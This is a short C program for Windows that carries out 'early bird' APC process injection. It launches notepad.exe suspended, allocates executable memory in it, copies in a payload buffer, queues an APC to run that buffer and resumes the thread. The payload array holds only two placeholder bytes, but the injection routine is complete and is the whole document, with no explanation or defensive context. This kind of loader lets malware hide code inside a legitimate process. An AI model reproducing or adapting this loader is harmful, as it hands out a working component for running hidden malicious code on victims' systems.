#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

unsigned char my_payload[] = {0x00, 0x00};

int main()
{
	STARTUPINFO			si; 
	PROCESS_INFORMATION pi;
	LPVOID				my_payload_mem;
	SIZE_T				my_payload_len = sizeof(my_payload);
	LPCWSTR				cmd;
	HANDLE				hProcess, hThread;
	NTSTATUS			status; 

	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);

	CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, 
				   false, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);

	WaitForSingleObject(pi.hProcess, 5000);
	hProcess = pi.hProcess;
	hThread  = pi.hThread;

	my_payload_mem = VirtualAllocEx(hProcess, NULL, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(hProcess, my_payload_mem, my_payload, my_payload_len, NULL);

	PTHREAD_START_ROUTINE apc_r = (PTHREAD_START_ROUTINE)my_payload_mem;
	QueueUserAPC((PAPCFUNC)apc_r, hThread, NULL);

	ResumeThread(hThread);
	return 0;
}
